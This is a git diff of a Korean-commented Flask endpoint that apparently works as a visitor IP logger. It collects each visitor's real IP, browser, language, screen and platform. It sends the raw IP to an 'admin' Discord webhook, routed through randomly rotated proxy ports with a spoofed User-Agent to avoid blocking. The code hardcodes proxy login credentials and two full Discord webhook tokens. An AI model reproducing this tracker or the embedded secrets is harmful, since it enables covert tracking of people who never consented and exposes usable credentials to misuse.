@@ -2,20 +2,26 @@ import requests
 import datetime
 import os
 import time
+import random
 from flask import Flask, render_template, request, jsonify
 
 app = Flask(__name__)
 
-# [프록시 설정]
-PROXY_URL = "http://mkmp3kpf:pka5tdl4@p.tokenu.to:10001"
-PROXIES = {"http": PROXY_URL, "https": PROXY_URL}
+# 사용할 수 있는 프록시 포트 리스트
+PROXY_PORTS = [10000, 10001, 10002, 10003, 10004, 10005, 10006, 10007, 10008, 10009]
 
-# [웹훅 주소] - 반드시 디스코드 설정에서 '서로 다른 채널'의 주소인지 확인하세요!
-MASKED_CHANNEL_URL = "https://discord.com/api/webhooks/1477919339205361767/C8Lbp7KnEF7S63YJOKf1PVa2u-t0i2Z6uk-Zqus8L9-QfR7aj-NlGW3zfVd41sX_beTX"
+# [웹훅 주소] 두 곳 모두 discordapp.com 도메인을 사용하도록 설정
+MASKED_CHANNEL_URL = "https://discordapp.com/api/webhooks/1477919339205361767/C8Lbp7KnEF7S63YJOKf1PVa2u-t0i2Z6uk-Zqus8L9-QfR7aj-NlGW3zfVd41sX_beTX"
 RAW_CHANNEL_URL = "https://discordapp.com/api/webhooks/1477910235048968275/otX6RnzhUAWP3WJRe8A_wMAQ9hWyLPSoY3kIAhYC__CIr87A1bXqoRLyWpeHnTsRPA_v"
 
+def get_proxies():
+    """무작위 포트를 선택하여 프록시 설정 생성"""
+    port = random.choice(PROXY_PORTS)
+    url = f"http://mkmp3kpf:pka5tdl4@p.tokenu.to:{port}"
+    print(f"🔄 현재 사용 포트: {port}")
+    return {"http": url, "https": url}
+
 def get_masked_ip(ip):
-    """IP 뒷자리를 xxx로 가려주는 함수"""
     try:
         parts = ip.split('.')
         return f"{parts[0]}.{parts[1]}.xxx.xxx" if len(parts) == 4 else ip
@@ -33,52 +39,47 @@ def handle_webhook():
         x_forwarded = request.headers.get('X-Forwarded-For')
         raw_ip = x_forwarded.split(',')[0].strip() if x_forwarded else request.remote_addr
         
-        # 1. 각각의 IP 변수 생성
-        masked_ip = get_masked_ip(raw_ip) # 가려진 IP
-        real_ip = raw_ip                  # 원본 IP
-        
+        masked_ip = get_masked_ip(raw_ip)
         user_agent = request.headers.get('User-Agent', 'Unknown')
         timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-        headers = {"User-Agent": "Mozilla/5.0"}
+        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
 
-        # 공통 정보 (해상도, 언어 등)
-        common_fields = [
-            {"name": "🌍 언어/지역", "value": f"`{client_data.get('language', 'N/A')}`", "inline": True},
-            {"name": "🖥️ 해상도", "value": f"`{client_data.get('screen', 'N/A')}`", "inline": True},
-            {"name": "⚙️ 플랫폼", "value": f"`{client_data.get('platform', 'N/A')}`", "inline": False},
-            {"name": "🕵️ 기기 정보", "value": f"```{user_agent}```", "inline": False}
-        ]
+        common_info = (
+            f"🌍 **언어**: `{client_data.get('language')}`\n"
+            f"🖥️ **해상도**: `{client_data.get('screen')}`\n"
+            f"⚙️ **기기**: `{client_data.get('platform')}`\n"
+            f"🕵️ **브라우저**:\n```{user_agent}```"
+        )
 
-        # --- 전송 1: 일반 채널 (가려진 IP 전송) ---
+        # 1. 마스킹 전송
         payload_masked = {
             "username": "일반 모니터링",
             "embeds": [{
-                "title": "🌐 접속 알림 (IP 마스킹)",
-                "color": 5763719, # 초록색
-                "fields": [{"name": "📍 접속 IP (보안)", "value": f"`{masked_ip}`", "inline": False}] + common_fields,
+                "title": "🌐 접속 알림 (보안 모드)",
+                "color": 5763719,
+                "description": f"📍 **IP**: `{masked_ip}`\n{common_info}",
                 "footer": {"text": f"기록 시각: {timestamp}"}
             }]
         }
-        res1 = requests.post(MASKED_CHANNEL_URL, json=payload_masked, headers=headers, proxies=PROXIES, timeout=10)
-        print(f"Masked Send: {res1.status_code}")
+        # 요청마다 프록시를 새로 랜덤하게 뽑음
+        requests.post(MASKED_CHANNEL_URL, json=payload_masked, headers=headers, proxies=get_proxies(), timeout=12)
 
-        time.sleep(2) # 디스코드 차단 방지용 딜레이
+        time.sleep(1.5)
 
-        # --- 전송 2: 관리자 채널 (원본 IP 전송) ---
+        # 2. 관리자 전송
         payload_raw = {
             "username": "관리자 보안 로그",
             "embeds": [{
-                "title": "🛡️ 상세 보안 로그 (원본 IP)",
-                "color": 15548997, # 빨간색
-                "fields": [{"name": "📍 실제 접속 IP", "value": f"`{real_ip}`", "inline": False}] + common_fields,
+                "title": "🛡️ 상세 보안 로그 (관리자 전용)",
+                "color": 15548997,
+                "description": f"📍 **IP**: `{raw_ip}`\n{common_info}",
                 "footer": {"text": f"기록 시각: {timestamp}"}
             }]
         }
-        res2 = requests.post(RAW_CHANNEL_URL, json=payload_raw, headers=headers, proxies=PROXIES, timeout=10)
-        print(f"Raw Send: {res2.status_code}")
+        requests.post(RAW_CHANNEL_URL, json=payload_raw, headers=headers, proxies=get_proxies(), timeout=12)
 
     except Exception as e:
-        print(f"에러 발생: {e}")
+        print(f"❌ 전송 실패: {e}")
 
     return jsonify({"status": "success"})
 
